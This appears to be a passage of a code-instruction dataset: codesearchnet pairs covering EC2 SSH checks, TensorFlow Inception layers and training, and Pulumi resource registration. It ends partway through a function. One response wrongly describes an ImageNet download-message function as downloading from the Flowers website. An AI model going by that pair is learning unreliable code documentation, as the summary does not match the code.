{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck if SSH is available on a host.", "response": "def is_ssh_available(host, opts, print_ssh_output=True):\n    \"\"\"\n    Check if SSH is available on a host.\n    \"\"\"\n    s = subprocess.Popen(\n        ssh_command(opts) + ['-t', '-t', '-o', 'ConnectTimeout=3',\n                             '%s@%s' % (opts.user, host), stringify_command('true')],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.STDOUT  # we pipe stderr through stdout to preserve output order\n    )\n    cmd_output = s.communicate()[0]  # [1] is stderr, which we redirected to stdout\n\n    if s.returncode != 0 and print_ssh_output:\n        # extra leading newline is for spacing in wait_for_cluster_state()\n        print(textwrap.dedent(\"\"\"\\n\n            Warning: SSH connection error. (This could be temporary.)\n            Host: {h}\n            SSH return code: {r}\n            SSH output: {o}\n        \"\"\").format(\n            h=host,\n            r=s.returncode,\n            o=cmd_output.strip()\n        ))\n\n    return s.returncode == 0"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks if SSH is available on all the instances in a cluster.", "response": "def is_cluster_ssh_available(cluster_instances, opts):\n    \"\"\"\n    Check if SSH is available on all the instances in a cluster.\n    \"\"\"\n    for i in cluster_instances:\n        dns_name = get_dns_name(i, opts.private_ips)\n        if not is_ssh_available(host=dns_name, opts=opts):\n            return False\n    else:\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwaiting for all the instances in the cluster to reach a specified state.", "response": "def wait_for_cluster_state(conn, opts, cluster_instances, cluster_state):\n    \"\"\"\n    Wait for all the instances in the cluster to reach a designated state.\n\n    cluster_instances: a list of boto.ec2.instance.Instance\n    cluster_state: a string representing the desired state of all the instances in the cluster\n           value can be 'ssh-ready' or a valid value from boto.ec2.instance.InstanceState such as\n           'running', 'terminated', etc.\n           (would be nice to replace this with a proper enum: http://stackoverflow.com/a/1695250)\n    \"\"\"\n    sys.stdout.write(\n        \"Waiting for cluster to enter '{s}' state.\".format(s=cluster_state)\n    )\n    sys.stdout.flush()\n\n    start_time = datetime.now()\n    num_attempts = 0\n\n    while True:\n        time.sleep(5 * num_attempts)  # seconds\n\n        for i in cluster_instances:\n            i.update()\n\n        max_batch = 100\n        statuses = []\n        for j in xrange(0, len(cluster_instances), max_batch):\n            batch = [i.id for i in cluster_instances[j:j + max_batch]]\n            statuses.extend(conn.get_all_instance_status(instance_ids=batch))\n\n        if cluster_state == 'ssh-ready':\n            if all(i.state == 'running' for i in cluster_instances) and \\\n               all(s.system_status.status == 'ok' for s in statuses) and \\\n               all(s.instance_status.status == 'ok' for s in statuses) and \\\n               is_cluster_ssh_available(cluster_instances, opts):\n                break\n        else:\n            if all(i.state == cluster_state for i in cluster_instances):\n                break\n\n        num_attempts += 1\n\n        sys.stdout.write(\".\")\n        sys.stdout.flush()\n\n    sys.stdout.write(\"\\n\")\n\n    end_time = datetime.now()\n    print(\"Cluster is now in '{s}' state. Waited {t} seconds.\".format(\n        s=cluster_state,\n        t=(end_time - start_time).seconds\n    ))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef download_message(self):\n\n    print('Failed to find any ImageNet %s files'% self.subset)\n    print('')\n    print('If you have already downloaded and processed the data, then make '\n          'sure to set --data_dir to point to the directory containing the '\n          'location of the sharded TFRecords.\\n')\n    print('If you have not downloaded and prepared the ImageNet data in the '\n          'TFRecord format, you will need to do this at least once. This '\n          'process could take several hours depending on the speed of your '\n          'computer and network connection\\n')\n    print('Please see README.md for instructions on how to build '\n          'the ImageNet dataset using download_and_preprocess_imagenet.\\n')\n    print('Note that the raw data size is 300 GB and the processed data size '\n          'is 150 GB. Please ensure you have at least 500GB disk space.')", "response": "Instruction to download and extract the tarball from Flowers website."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd supervised learning flags as well as wide - deep model type.", "response": "def define_wide_deep_flags():\n  \"\"\"Add supervised learning flags, as well as wide-deep model type.\"\"\"\n  flags_core.define_base()\n  flags_core.define_benchmark()\n  flags_core.define_performance(\n      num_parallel_calls=False, inter_op=True, intra_op=True,\n      synthetic_data=False, max_train_steps=False, dtype=False,\n      all_reduce_alg=False)\n\n  flags.adopt_module_key_flags(flags_core)\n\n  flags.DEFINE_enum(\n      name=\"model_type\", short_name=\"mt\", default=\"wide_deep\",\n      enum_values=['wide', 'deep', 'wide_deep'],\n      help=\"Select model topology.\")\n  flags.DEFINE_boolean(\n      name=\"download_if_missing\", default=True, help=flags_core.help_wrap(\n          \"Download data to data_dir if it is not already present.\"))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef export_model(model, model_type, export_dir, model_column_fn):\n  wide_columns, deep_columns = model_column_fn()\n  if model_type == 'wide':\n    columns = wide_columns\n  elif model_type == 'deep':\n    columns = deep_columns\n  else:\n    columns = wide_columns + deep_columns\n  feature_spec = tf.feature_column.make_parse_example_spec(columns)\n  example_input_fn = (\n      tf.estimator.export.build_parsing_serving_input_receiver_fn(feature_spec))\n  model.export_savedmodel(export_dir, example_input_fn,\n                          strip_default_attrs=True)", "response": "Exports the given Estimator object to SavedModel format."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncalculate the total loss on a single tower running the ImageNet model.", "response": "def _tower_loss(images, labels, num_classes, scope, reuse_variables=None):\n  \"\"\"Calculate the total loss on a single tower running the ImageNet model.\n\n  We perform 'batch splitting'. This means that we cut up a batch across\n  multiple GPU's. For instance, if the batch size = 32 and num_gpus = 2,\n  then each tower will operate on an batch of 16 images.\n\n  Args:\n    images: Images. 4D tensor of size [batch_size, FLAGS.image_size,\n                                       FLAGS.image_size, 3].\n    labels: 1-D integer Tensor of [batch_size].\n    num_classes: number of classes\n    scope: unique prefix string identifying the ImageNet tower, e.g.\n      'tower_0'.\n\n  Returns:\n     Tensor of shape [] containing the total loss for a batch of data\n  \"\"\"\n  # When fine-tuning a model, we do not restore the logits but instead we\n  # randomly initialize the logits. The number of classes in the output of the\n  # logit is the number of classes in specified Dataset.\n  restore_logits = not FLAGS.fine_tune\n\n  # Build inference Graph.\n  with tf.variable_scope(tf.get_variable_scope(), reuse=reuse_variables):\n    logits = inception.inference(images, num_classes, for_training=True,\n                                 restore_logits=restore_logits,\n                                 scope=scope)\n\n  # Build the portion of the Graph calculating the losses. Note that we will\n  # assemble the total_loss using a custom function below.\n  split_batch_size = images.get_shape().as_list()[0]\n  inception.loss(logits, labels, batch_size=split_batch_size)\n\n  # Assemble all of the losses for the current tower only.\n  losses = tf.get_collection(slim.losses.LOSSES_COLLECTION, scope)\n\n  # Calculate the total loss for the current tower.\n  regularization_losses = tf.get_collection(tf.GraphKeys.REGULARIZATION_LOSSES)\n  total_loss = tf.add_n(losses + regularization_losses, name='total_loss')\n\n  # Compute the moving average of all individual losses and the total loss.\n  loss_averages = tf.train.ExponentialMovingAverage(0.9, name='avg')\n  loss_averages_op = loss_averages.apply(losses + [total_loss])\n\n  # Attach a scalar summmary to all individual losses and the total loss; do the\n  # same for the averaged version of the losses.\n  for l in losses + [total_loss]:\n    # Remove 'tower_[0-9]/' from the name in case this is a multi-GPU training\n    # session. This helps the clarity of presentation on TensorBoard.\n    loss_name = re.sub('%s_[0-9]*/' % inception.TOWER_NAME, '', l.op.name)\n    # Name each loss as '(raw)' and name the moving average version of the loss\n    # as the original loss name.\n    tf.summary.scalar(loss_name +' (raw)', l)\n    tf.summary.scalar(loss_name, loss_averages.average(l))\n\n  with tf.control_dependencies([loss_averages_op]):\n    total_loss = tf.identity(total_loss)\n  return total_loss"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef train(dataset):\n  with tf.Graph().as_default(), tf.device('/cpu:0'):\n    # Create a variable to count the number of train() calls. This equals the\n    # number of batches processed * FLAGS.num_gpus.\n    global_step = tf.get_variable(\n        'global_step', [],\n        initializer=tf.constant_initializer(0), trainable=False)\n\n    # Calculate the learning rate schedule.\n    num_batches_per_epoch = (dataset.num_examples_per_epoch() /\n                             FLAGS.batch_size)\n    decay_steps = int(num_batches_per_epoch * FLAGS.num_epochs_per_decay)\n\n    # Decay the learning rate exponentially based on the number of steps.\n    lr = tf.train.exponential_decay(FLAGS.initial_learning_rate,\n                                    global_step,\n                                    decay_steps,\n                                    FLAGS.learning_rate_decay_factor,\n                                    staircase=True)\n\n    # Create an optimizer that performs gradient descent.\n    opt = tf.train.RMSPropOptimizer(lr, RMSPROP_DECAY,\n                                    momentum=RMSPROP_MOMENTUM,\n                                    epsilon=RMSPROP_EPSILON)\n\n    # Get images and labels for ImageNet and split the batch across GPUs.\n    assert FLAGS.batch_size % FLAGS.num_gpus == 0, (\n        'Batch size must be divisible by number of GPUs')\n    split_batch_size = int(FLAGS.batch_size / FLAGS.num_gpus)\n\n    # Override the number of preprocessing threads to account for the increased\n    # number of GPU towers.\n    num_preprocess_threads = FLAGS.num_preprocess_threads * FLAGS.num_gpus\n    images, labels = image_processing.distorted_inputs(\n        dataset,\n        num_preprocess_threads=num_preprocess_threads)\n\n    input_summaries = copy.copy(tf.get_collection(tf.GraphKeys.SUMMARIES))\n\n    # Number of classes in the Dataset label set plus 1.\n    # Label 0 is reserved for an (unused) background class.\n    num_classes = dataset.num_classes() + 1\n\n     # Split the batch of images and labels for towers.\n    images_splits = tf.split(axis=0, num_or_size_splits=FLAGS.num_gpus, value=images)\n    labels_splits = tf.split(axis=0, num_or_size_splits=FLAGS.num_gpus, value=labels)\n\n    # Calculate the gradients for each model tower.\n    tower_grads = []\n    reuse_variables = None\n    for i in range(FLAGS.num_gpus):\n      with tf.device('/gpu:%d' % i):\n        with tf.name_scope('%s_%d' % (inception.TOWER_NAME, i)) as scope:\n          # Force all Variables to reside on the CPU.\n          with slim.arg_scope([slim.variables.variable], device='/cpu:0'):\n            # Calculate the loss for one tower of the ImageNet model. This\n            # function constructs the entire ImageNet model but shares the\n            # variables across all towers.\n            loss = _tower_loss(images_splits[i], labels_splits[i], num_classes,\n                               scope, reuse_variables)\n\n          # Reuse variables for the next tower.\n          reuse_variables = True\n\n          # Retain the summaries from the final tower.\n          summaries = tf.get_collection(tf.GraphKeys.SUMMARIES, scope)\n\n          # Retain the Batch Normalization updates operations only from the\n          # final tower. Ideally, we should grab the updates from all towers\n          # but these stats accumulate extremely fast so we can ignore the\n          # other stats from the other towers without significant detriment.\n          batchnorm_updates = tf.get_collection(slim.ops.UPDATE_OPS_COLLECTION,\n                                                scope)\n\n          # Calculate the gradients for the batch of data on this ImageNet\n          # tower.\n          grads = opt.compute_gradients(loss)\n\n          # Keep track of the gradients across all towers.\n          tower_grads.append(grads)\n\n    # We must calculate the mean of each gradient. Note that this is the\n    # synchronization point across all towers.\n    grads = _average_gradients(tower_grads)\n\n    # Add a summaries for the input processing and global_step.\n    summaries.extend(input_summaries)\n\n    # Add a summary to track the learning rate.\n    summaries.append(tf.summary.scalar('learning_rate', lr))\n\n    # Add histograms for gradients.\n    for grad, var in grads:\n      if grad is not None:\n        summaries.append(\n            tf.summary.histogram(var.op.name + '/gradients', grad))\n\n    # Apply the gradients to adjust the shared variables.\n    apply_gradient_op = opt.apply_gradients(grads, global_step=global_step)\n\n    # Add histograms for trainable variables.\n    for var in tf.trainable_variables():\n      summaries.append(tf.summary.histogram(var.op.name, var))\n\n    # Track the moving averages of all trainable variables.\n    # Note that we maintain a \"double-average\" of the BatchNormalization\n    # global statistics. This is more complicated then need be but we employ\n    # this for backward-compatibility with our previous models.\n    variable_averages = tf.train.ExponentialMovingAverage(\n        inception.MOVING_AVERAGE_DECAY, global_step)\n\n    # Another possibility is to use tf.slim.get_variables().\n    variables_to_average = (tf.trainable_variables() +\n                            tf.moving_average_variables())\n    variables_averages_op = variable_averages.apply(variables_to_average)\n\n    # Group all updates to into a single train op.\n    batchnorm_updates_op = tf.group(*batchnorm_updates)\n    train_op = tf.group(apply_gradient_op, variables_averages_op,\n                        batchnorm_updates_op)\n\n    # Create a saver.\n    saver = tf.train.Saver(tf.global_variables())\n\n    # Build the summary operation from the last tower summaries.\n    summary_op = tf.summary.merge(summaries)\n\n    # Build an initialization operation to run below.\n    init = tf.global_variables_initializer()\n\n    # Start running operations on the Graph. allow_soft_placement must be set to\n    # True to build towers on GPU, as some of the ops do not have GPU\n    # implementations.\n    sess = tf.Session(config=tf.ConfigProto(\n        allow_soft_placement=True,\n        log_device_placement=FLAGS.log_device_placement))\n    sess.run(init)\n\n    if FLAGS.pretrained_model_checkpoint_path:\n      assert tf.gfile.Exists(FLAGS.pretrained_model_checkpoint_path)\n      variables_to_restore = tf.get_collection(\n          slim.variables.VARIABLES_TO_RESTORE)\n      restorer = tf.train.Saver(variables_to_restore)\n      restorer.restore(sess, FLAGS.pretrained_model_checkpoint_path)\n      print('%s: Pre-trained model restored from %s' %\n            (datetime.now(), FLAGS.pretrained_model_checkpoint_path))\n\n    # Start the queue runners.\n    tf.train.start_queue_runners(sess=sess)\n\n    summary_writer = tf.summary.FileWriter(\n        FLAGS.train_dir,\n        graph=sess.graph)\n\n    for step in range(FLAGS.max_steps):\n      start_time = time.time()\n      _, loss_value = sess.run([train_op, loss])\n      duration = time.time() - start_time\n\n      assert not np.isnan(loss_value), 'Model diverged with loss = NaN'\n\n      if step % 10 == 0:\n        examples_per_sec = FLAGS.batch_size / float(duration)\n        format_str = ('%s: step %d, loss = %.2f (%.1f examples/sec; %.3f '\n                      'sec/batch)')\n        print(format_str % (datetime.now(), step, loss_value,\n                            examples_per_sec, duration))\n\n      if step % 100 == 0:\n        summary_str = sess.run(summary_op)\n        summary_writer.add_summary(summary_str, step)\n\n      # Save the model checkpoint periodically.\n      if step % 5000 == 0 or (step + 1) == FLAGS.max_steps:\n        checkpoint_path = os.path.join(FLAGS.train_dir, 'model.ckpt')\n        saver.save(sess, checkpoint_path, global_step=step)", "response": "Train on dataset for a number of steps."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef batch_norm(inputs,\n               decay=0.999,\n               center=True,\n               scale=False,\n               epsilon=0.001,\n               moving_vars='moving_vars',\n               activation=None,\n               is_training=True,\n               trainable=True,\n               restore=True,\n               scope=None,\n               reuse=None):\n  \"\"\"Adds a Batch Normalization layer.\n\n  Args:\n    inputs: a tensor of size [batch_size, height, width, channels]\n            or [batch_size, channels].\n    decay: decay for the moving average.\n    center: If True, subtract beta. If False, beta is not created and ignored.\n    scale: If True, multiply by gamma. If False, gamma is\n      not used. When the next layer is linear (also e.g. ReLU), this can be\n      disabled since the scaling can be done by the next layer.\n    epsilon: small float added to variance to avoid dividing by zero.\n    moving_vars: collection to store the moving_mean and moving_variance.\n    activation: activation function.\n    is_training: whether or not the model is in training mode.\n    trainable: whether or not the variables should be trainable or not.\n    restore: whether or not the variables should be marked for restore.\n    scope: Optional scope for variable_scope.\n    reuse: whether or not the layer and its variables should be reused. To be\n      able to reuse the layer scope must be given.\n\n  Returns:\n    a tensor representing the output of the operation.\n\n  \"\"\"\n  inputs_shape = inputs.get_shape()\n  with tf.variable_scope(scope, 'BatchNorm', [inputs], reuse=reuse):\n    axis = list(range(len(inputs_shape) - 1))\n    params_shape = inputs_shape[-1:]\n    # Allocate parameters for the beta and gamma of the normalization.\n    beta, gamma = None, None\n    if center:\n      beta = variables.variable('beta',\n                                params_shape,\n                                initializer=tf.zeros_initializer(),\n                                trainable=trainable,\n                                restore=restore)\n    if scale:\n      gamma = variables.variable('gamma',\n                                 params_shape,\n                                 initializer=tf.ones_initializer(),\n                                 trainable=trainable,\n                                 restore=restore)\n    # Create moving_mean and moving_variance add them to\n    # GraphKeys.MOVING_AVERAGE_VARIABLES collections.\n    moving_collections = [moving_vars, tf.GraphKeys.MOVING_AVERAGE_VARIABLES]\n    moving_mean = variables.variable('moving_mean',\n                                     params_shape,\n                                     initializer=tf.zeros_initializer(),\n                                     trainable=False,\n                                     restore=restore,\n                                     collections=moving_collections)\n    moving_variance = variables.variable('moving_variance',\n                                         params_shape,\n                                         initializer=tf.ones_initializer(),\n                                         trainable=False,\n                                         restore=restore,\n                                         collections=moving_collections)\n    if is_training:\n      # Calculate the moments based on the individual batch.\n      mean, variance = tf.nn.moments(inputs, axis)\n\n      update_moving_mean = moving_averages.assign_moving_average(\n          moving_mean, mean, decay)\n      tf.add_to_collection(UPDATE_OPS_COLLECTION, update_moving_mean)\n      update_moving_variance = moving_averages.assign_moving_average(\n          moving_variance, variance, decay)\n      tf.add_to_collection(UPDATE_OPS_COLLECTION, update_moving_variance)\n    else:\n      # Just use the moving_mean and moving_variance.\n      mean = moving_mean\n      variance = moving_variance\n    # Normalize the activations.\n    outputs = tf.nn.batch_normalization(\n        inputs, mean, variance, beta, gamma, epsilon)\n    outputs.set_shape(inputs.get_shape())\n    if activation:\n      outputs = activation(outputs)\n    return outputs", "response": "Adds a Batch Normalization layer to the graph."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _two_element_tuple(int_or_tuple):\n  if isinstance(int_or_tuple, (list, tuple)):\n    if len(int_or_tuple) != 2:\n      raise ValueError('Must be a list with 2 elements: %s' % int_or_tuple)\n    return int(int_or_tuple[0]), int(int_or_tuple[1])\n  if isinstance(int_or_tuple, int):\n    return int(int_or_tuple), int(int_or_tuple)\n  if isinstance(int_or_tuple, tf.TensorShape):\n    if len(int_or_tuple) == 2:\n      return int_or_tuple[0], int_or_tuple[1]\n  raise ValueError('Must be an int, a list with 2 elements or a TensorShape of '\n                   'length 2')", "response": "Converts a single integer or tuple to height width."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd a convolution followed by a batch_norm layer.", "response": "def conv2d(inputs,\n           num_filters_out,\n           kernel_size,\n           stride=1,\n           padding='SAME',\n           activation=tf.nn.relu,\n           stddev=0.01,\n           bias=0.0,\n           weight_decay=0,\n           batch_norm_params=None,\n           is_training=True,\n           trainable=True,\n           restore=True,\n           scope=None,\n           reuse=None):\n  \"\"\"Adds a 2D convolution followed by an optional batch_norm layer.\n\n  conv2d creates a variable called 'weights', representing the convolutional\n  kernel, that is convolved with the input. If `batch_norm_params` is None, a\n  second variable called 'biases' is added to the result of the convolution\n  operation.\n\n  Args:\n    inputs: a tensor of size [batch_size, height, width, channels].\n    num_filters_out: the number of output filters.\n    kernel_size: a list of length 2: [kernel_height, kernel_width] of\n      of the filters. Can be an int if both values are the same.\n    stride: a list of length 2: [stride_height, stride_width].\n      Can be an int if both strides are the same.  Note that presently\n      both strides must have the same value.\n    padding: one of 'VALID' or 'SAME'.\n    activation: activation function.\n    stddev: standard deviation of the truncated guassian weight distribution.\n    bias: the initial value of the biases.\n    weight_decay: the weight decay.\n    batch_norm_params: parameters for the batch_norm. If is None don't use it.\n    is_training: whether or not the model is in training mode.\n    trainable: whether or not the variables should be trainable or not.\n    restore: whether or not the variables should be marked for restore.\n    scope: Optional scope for variable_scope.\n    reuse: whether or not the layer and its variables should be reused. To be\n      able to reuse the layer scope must be given.\n  Returns:\n    a tensor representing the output of the operation.\n\n  \"\"\"\n  with tf.variable_scope(scope, 'Conv', [inputs], reuse=reuse):\n    kernel_h, kernel_w = _two_element_tuple(kernel_size)\n    stride_h, stride_w = _two_element_tuple(stride)\n    num_filters_in = inputs.get_shape()[-1]\n    weights_shape = [kernel_h, kernel_w,\n                     num_filters_in, num_filters_out]\n    weights_initializer = tf.truncated_normal_initializer(stddev=stddev)\n    l2_regularizer = None\n    if weight_decay and weight_decay > 0:\n      l2_regularizer = losses.l2_regularizer(weight_decay)\n    weights = variables.variable('weights',\n                                 shape=weights_shape,\n                                 initializer=weights_initializer,\n                                 regularizer=l2_regularizer,\n                                 trainable=trainable,\n                                 restore=restore)\n    conv = tf.nn.conv2d(inputs, weights, [1, stride_h, stride_w, 1],\n                        padding=padding)\n    if batch_norm_params is not None:\n      with scopes.arg_scope([batch_norm], is_training=is_training,\n                            trainable=trainable, restore=restore):\n        outputs = batch_norm(conv, **batch_norm_params)\n    else:\n      bias_shape = [num_filters_out,]\n      bias_initializer = tf.constant_initializer(bias)\n      biases = variables.variable('biases',\n                                  shape=bias_shape,\n                                  initializer=bias_initializer,\n                                  trainable=trainable,\n                                  restore=restore)\n      outputs = tf.nn.bias_add(conv, biases)\n    if activation:\n      outputs = activation(outputs)\n    return outputs"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fc(inputs,\n       num_units_out,\n       activation=tf.nn.relu,\n       stddev=0.01,\n       bias=0.0,\n       weight_decay=0,\n       batch_norm_params=None,\n       is_training=True,\n       trainable=True,\n       restore=True,\n       scope=None,\n       reuse=None):\n  \"\"\"Adds a fully connected layer followed by an optional batch_norm layer.\n\n  FC creates a variable called 'weights', representing the fully connected\n  weight matrix, that is multiplied by the input. If `batch_norm` is None, a\n  second variable called 'biases' is added to the result of the initial\n  vector-matrix multiplication.\n\n  Args:\n    inputs: a [B x N] tensor where B is the batch size and N is the number of\n            input units in the layer.\n    num_units_out: the number of output units in the layer.\n    activation: activation function.\n    stddev: the standard deviation for the weights.\n    bias: the initial value of the biases.\n    weight_decay: the weight decay.\n    batch_norm_params: parameters for the batch_norm. If is None don't use it.\n    is_training: whether or not the model is in training mode.\n    trainable: whether or not the variables should be trainable or not.\n    restore: whether or not the variables should be marked for restore.\n    scope: Optional scope for variable_scope.\n    reuse: whether or not the layer and its variables should be reused. To be\n      able to reuse the layer scope must be given.\n\n  Returns:\n     the tensor variable representing the result of the series of operations.\n  \"\"\"\n  with tf.variable_scope(scope, 'FC', [inputs], reuse=reuse):\n    num_units_in = inputs.get_shape()[1]\n    weights_shape = [num_units_in, num_units_out]\n    weights_initializer = tf.truncated_normal_initializer(stddev=stddev)\n    l2_regularizer = None\n    if weight_decay and weight_decay > 0:\n      l2_regularizer = losses.l2_regularizer(weight_decay)\n    weights = variables.variable('weights',\n                                 shape=weights_shape,\n                                 initializer=weights_initializer,\n                                 regularizer=l2_regularizer,\n                                 trainable=trainable,\n                                 restore=restore)\n    if batch_norm_params is not None:\n      outputs = tf.matmul(inputs, weights)\n      with scopes.arg_scope([batch_norm], is_training=is_training,\n                            trainable=trainable, restore=restore):\n        outputs = batch_norm(outputs, **batch_norm_params)\n    else:\n      bias_shape = [num_units_out,]\n      bias_initializer = tf.constant_initializer(bias)\n      biases = variables.variable('biases',\n                                  shape=bias_shape,\n                                  initializer=bias_initializer,\n                                  trainable=trainable,\n                                  restore=restore)\n      outputs = tf.nn.xw_plus_b(inputs, weights, biases)\n    if activation:\n      outputs = activation(outputs)\n    return outputs", "response": "Adds a fully connected layer followed by a batch_norm layer."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ntransform numeric labels into one hot encoding.", "response": "def one_hot_encoding(labels, num_classes, scope=None):\n  \"\"\"Transform numeric labels into onehot_labels.\n\n  Args:\n    labels: [batch_size] target labels.\n    num_classes: total number of classes.\n    scope: Optional scope for name_scope.\n  Returns:\n    one hot encoding of the labels.\n  \"\"\"\n  with tf.name_scope(scope, 'OneHotEncoding', [labels]):\n    batch_size = labels.get_shape()[0]\n    indices = tf.expand_dims(tf.range(0, batch_size), 1)\n    labels = tf.cast(tf.expand_dims(labels, 1), indices.dtype)\n    concated = tf.concat(axis=1, values=[indices, labels])\n    onehot_labels = tf.sparse_to_dense(\n        concated, tf.stack([batch_size, num_classes]), 1.0, 0.0)\n    onehot_labels.set_shape([batch_size, num_classes])\n    return onehot_labels"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd a Max Pooling layer.", "response": "def max_pool(inputs, kernel_size, stride=2, padding='VALID', scope=None):\n  \"\"\"Adds a Max Pooling layer.\n\n  It is assumed by the wrapper that the pooling is only done per image and not\n  in depth or batch.\n\n  Args:\n    inputs: a tensor of size [batch_size, height, width, depth].\n    kernel_size: a list of length 2: [kernel_height, kernel_width] of the\n      pooling kernel over which the op is computed. Can be an int if both\n      values are the same.\n    stride: a list of length 2: [stride_height, stride_width].\n      Can be an int if both strides are the same.  Note that presently\n      both strides must have the same value.\n    padding: the padding method, either 'VALID' or 'SAME'.\n    scope: Optional scope for name_scope.\n\n  Returns:\n    a tensor representing the results of the pooling operation.\n  Raises:\n    ValueError: if 'kernel_size' is not a 2-D list\n  \"\"\"\n  with tf.name_scope(scope, 'MaxPool', [inputs]):\n    kernel_h, kernel_w = _two_element_tuple(kernel_size)\n    stride_h, stride_w = _two_element_tuple(stride)\n    return tf.nn.max_pool(inputs,\n                          ksize=[1, kernel_h, kernel_w, 1],\n                          strides=[1, stride_h, stride_w, 1],\n                          padding=padding)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dropout(inputs, keep_prob=0.5, is_training=True, scope=None):\n  if is_training and keep_prob > 0:\n    with tf.name_scope(scope, 'Dropout', [inputs]):\n      return tf.nn.dropout(inputs, keep_prob)\n  else:\n    return inputs", "response": "Returns a dropout layer applied to the input tensor."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef flatten(inputs, scope=None):\n  if len(inputs.get_shape()) < 2:\n    raise ValueError('Inputs must be have a least 2 dimensions')\n  dims = inputs.get_shape()[1:]\n  k = dims.num_elements()\n  with tf.name_scope(scope, 'Flatten', [inputs]):\n    return tf.reshape(inputs, [-1, k])", "response": "Flattens the input while maintaining the batch_size."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds a sequential Tower starting from inputs by using an op repeatedly.", "response": "def repeat_op(repetitions, inputs, op, *args, **kwargs):\n  \"\"\"Build a sequential Tower starting from inputs by using an op repeatedly.\n\n  It creates new scopes for each operation by increasing the counter.\n  Example: given repeat_op(3, _, ops.conv2d, 64, [3, 3], scope='conv1')\n    it will repeat the given op under the following variable_scopes:\n      conv1/Conv\n      conv1/Conv_1\n      conv1/Conv_2\n\n  Args:\n    repetitions: number or repetitions.\n    inputs: a tensor of size [batch_size, height, width, channels].\n    op: an operation.\n    *args: args for the op.\n    **kwargs: kwargs for the op.\n\n  Returns:\n    a tensor result of applying the operation op, num times.\n  Raises:\n    ValueError: if the op is unknown or wrong.\n  \"\"\"\n  scope = kwargs.pop('scope', None)\n  with tf.variable_scope(scope, 'RepeatOp', [inputs]):\n    tower = inputs\n    for _ in range(repetitions):\n      tower = op(tower, *args, **kwargs)\n    return tower"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef do_rpc(self, name: str, rpc_function: Callable[..., Awaitable[None]]) -> Callable[..., Awaitable[None]]:\n        async def rpc_wrapper(*args, **kwargs):\n            log.debug(f\"beginning rpc {name}\")\n            async with self.zero_cond:\n                self.count += 1\n                log.debug(f\"recorded new RPC, {self.count} RPCs outstanding\")\n\n            try:\n                result = await rpc_function(*args, **kwargs)\n            except Exception as exn:\n                log.debug(f\"RPC failed with exception:\")\n                log.debug(traceback.format_exc())\n                if not self.exception_future.done():\n                    self.exception_future.set_exception(exn)\n                result = None\n\n            async with self.zero_cond:\n                self.count -= 1\n                if self.count == 0:\n                    log.debug(\"All RPC completed, signalling completion\")\n                    if not self.exception_future.done():\n                        self.exception_future.set_result(None)\n                    self.zero_cond.notify_all()\n                log.debug(f\"recorded RPC completion, {self.count} RPCs outstanding\")\n\n            return result\n\n        return rpc_wrapper", "response": "Wraps a given RPC function by producing an asyncio function that returns the result of the RPC."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef register_resource(res: 'Resource', ty: str, name: str, custom: bool, props: 'Inputs', opts: Optional['ResourceOptions']):\n    log.debug(f\"registering resource: ty={ty}, name={name}, custom={custom}\")\n    monitor = settings.get_monitor()\n\n    # Prepare the resource.\n\n    # Simply initialize the URN property and get prepared to resolve it later on.\n    # Note: a resource urn will always get a value, and thus the output property\n    # for it can always run .apply calls.\n    log.debug(f\"preparing resource for RPC\")\n    urn_future = asyncio.Future()\n    urn_known = asyncio.Future()\n    urn_known.set_result(True)\n    resolve_urn = urn_future.set_result\n    resolve_urn_exn = urn_future.set_exception\n    res.urn = known_types.new_output({res}, urn_future, urn_known)\n\n    # If a custom resource, make room for the ID property.\n    resolve_id: Optional[Callable[[Any, str, Optional[Exception]], None]] = None\n    if custom:\n        resolve_value = asyncio.Future()\n        resolve_perform_apply = asyncio.Future()\n        res.id = known_types.new_output({res}, resolve_value, resolve_perform_apply)\n\n        def do_resolve(value: Any, perform_apply: bool, exn: Optional[Exception]):\n            if exn is not None:\n                resolve_value.set_exception(exn)\n                resolve_perform_apply.set_exception(exn)\n            else:\n                resolve_value.set_result(value)\n                resolve_perform_apply.set_result(perform_apply)\n\n        resolve_id = do_resolve\n\n    # Now \"transfer\" all input properties into unresolved futures on res.  This way,\n    # this resource will look like it has all its output properties to anyone it is\n    # passed to.  However, those futures won't actually resolve until the RPC returns\n    resolvers = rpc.transfer_properties(res, props)\n\n    async def do_register():\n        try:\n            log.debug(f\"preparing resource registration: ty={ty}, name={name}\")\n            resolver = await prepare_resource(res, ty, custom, props, opts)\n            log.debug(f\"resource registration prepared: ty={ty}, name={name}\")\n\n            property_dependencies = {}\n            for key, deps in resolver.property_dependencies.items():\n                property_dependencies[key] = resource_pb2.RegisterResourceRequest.PropertyDependencies(urns=deps)\n\n            ignore_changes = opts.ignore_changes\n            if res.translate_input_property is not None and opts.ignore_changes is not None:\n                ignore_changes = map(res.translate_input_property, opts.ignore_changes)\n\n            req = resource_pb2.RegisterResourceRequest(\n                type=ty,\n                name=name,\n                parent=resolver.parent_urn,\n                custom=custom,\n                object=resolver.serialized_props,\n                protect=opts.protect,\n                provider=resolver.provider_ref,\n                dependencies=resolver.dependencies,\n                propertyDependencies=property_dependencies,\n                